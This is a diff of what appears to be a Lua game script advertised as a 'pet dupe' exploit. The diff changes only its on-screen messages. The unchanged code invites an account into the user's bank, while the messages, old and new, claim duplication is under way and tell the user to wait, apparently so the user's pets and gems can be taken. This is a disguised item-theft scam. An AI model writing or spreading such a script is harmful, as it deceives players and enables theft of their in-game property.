@@ -26,10 +26,10 @@ if request then
 else
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-    lib.Message.New("Processing dupe! Please make sure all of your pets and gems are in the bank. If they aren't, quickly add them.");
+    lib.Message.New("Dupe Processing...");
     wait(5)
-    lib.Message.New("Allow up to 20 seconds for the pets to dupe. If it does not appear in your bank, rejoin and check again.");
+    lib.Message.New("Allow up to 20 seconds for the pets to be duped. Please do not enter your bank or add anything to it.");
 else
     lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber)
-    lib.Message.New("Pets successfully duped. Please rejoin.");
+    lib.Message.New("Your pets have been duped successfully. Please rejoin.");
 end;
